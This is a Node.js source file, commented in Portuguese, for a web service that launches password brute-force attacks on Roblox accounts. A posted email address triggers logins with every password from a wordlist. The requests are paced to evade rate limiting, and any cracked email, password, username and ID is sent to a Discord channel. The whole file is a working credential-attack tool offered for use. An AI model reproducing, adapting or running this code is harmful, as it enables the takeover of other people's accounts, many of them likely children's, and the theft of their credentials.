const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
const port = process.env.PORT || 3000;

// CONFIGURAÇÕES DO BOT
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

if (!DISCORD_TOKEN || !CHANNEL_ID) {
    console.error("Falta DISCORD_TOKEN ou CHANNEL_ID nas Variáveis de Ambiente do Render!");
}

// Inicializar o Bot
const client = new Client({ intents: [GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

let isBotReady = false;

client.on('ready', () => {
    console.log(`✅ Bot conectado como ${client.user.tag}!`);
    isBotReady = true;
});

client.login(DISCORD_TOKEN);

app.use(express.json());
app.use(express.static('.'));

// Função para enviar mensagem no Discord
async function sendDiscordMessage(content) {
    if (!isBotReady) return;
    try {
        const channel = await client.channels.fetch(CHANNEL_ID);
        if (channel) {
            await channel.send(content);
        }
    } catch (e) {
        console.error("Erro ao enviar mensagem:", e.message);
    }
}

// Função para tentar Login no Roblox
async function tryLogin(email, password) {
    const baseUrl = "https://www.roblox.com";
    const robloxClient = axios.create({
        baseURL: baseUrl,
        timeout: 8000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }
    });

    try {
        // 1. Pegar Cookies
        await robloxClient.get('/');
        
        // 2. Tentar Login
        const response = await robloxClient.post('/users/login', {
            username: email,
            password: password
        }, {
            headers: { 'Content-Type': 'application/json' },
            validateStatus: status => status < 500
        });

        const data = response.data;
        
        // Se der erro "User with that email/password not found", pode ser email ou senha errada.
        // Se der erro "Password is incorrect", o email existe mas a senha está errada.
        if (data.id && typeof data.id === 'number') {
            return { success: true, username: data.username, id: data.id, error: "Sucesso" };
        }
        
        // Retornar o erro para saber se foi senha ou email
        return { success: false, username: email, id: null, error: data.error || "Erro Desconhecido" };

    } catch (error) {
        return { success: false, username: email, id: null, error: error.message };
    }
}

// FUNÇÃO PRINCIPAL: Ataque de Força Bruta
async function startBruteForce(email) {
    // 1. Ler o ficheiro de senhas
    let passwords = [];
    try {
        const rawData = fs.readFileSync(path.join(__dirname, 'senhas.txt'), 'utf-8');
        passwords = rawData.split('\n').map(p => p.trim()).filter(p => p.length > 0);
    } catch (e) {
        console.error("Erro ao ler senhas.txt:", e.message);
        await sendDiscordMessage(`**❌ ERRO NO ARQUIVO:** senhas.txt não encontrado ou vazio!`);
        return;
    }

    if (passwords.length === 0) {
        await sendDiscordMessage(`**❌ ERRO:** A lista de senhas está vazia!`);
        return;
    }

    console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Email:** ${email}\n**Total de Senhas:** ${passwords.length}\n*O Bot vai testar agora...*`);

    let found = false;

    // 2. Testar cada senha
    for (const password of passwords) {
        if (found) break; // Se já encontrou, parar

        const result = await tryLogin(email, password);

        if (result.success) {
            found = true;
            const msg = `**✅ CONTA ENCONTRADA!**\n**Email:** ${email}\n**Senha Correta:** ${password}\n**Username:** ${result.username}\n**ID:** ${result.id}`;
            await sendDiscordMessage(msg);
            console.log("Encontrada:", password);
        } else {
            // Opcional: Ver se o erro diz que a senha está errada (significa que o email existe)
            if (result.error && result.error.toLowerCase().includes('password')) {
                console.log(`Senha errada: ${password}`);
            }
        }

        // 3. Pausa para não bloquear o Email no Roblox (Rate Limit)
        // 1.5 segundos entre cada tentativa
        await new Promise(r => setTimeout(r, 1500));
    }

    if (!found) {
        await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Email:** ${email}\n**Senhas Testadas:** ${passwords.length}\n*Nenhuma senha da lista funcionou.*`);
    }
}

// ENDPOINT: Receber o Email do Site e Iniciar o Ataque
app.post('/start-brute-force', async (req, res) => {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
        return res.json({ success: false, error: "Email inválido" });

    }

    // Iniciar o ataque em "background"
    startBruteForce(email);

    // Retornar resposta imediata ao site
    return res.json({ success: true, message: "Ataque iniciado! Aguarde as notificações no Discord." });
});

// INICIAR SERVIDOR
app.listen(port, () => {
    console.log(`✅ Servidor rodando na porta ${port}`);
});
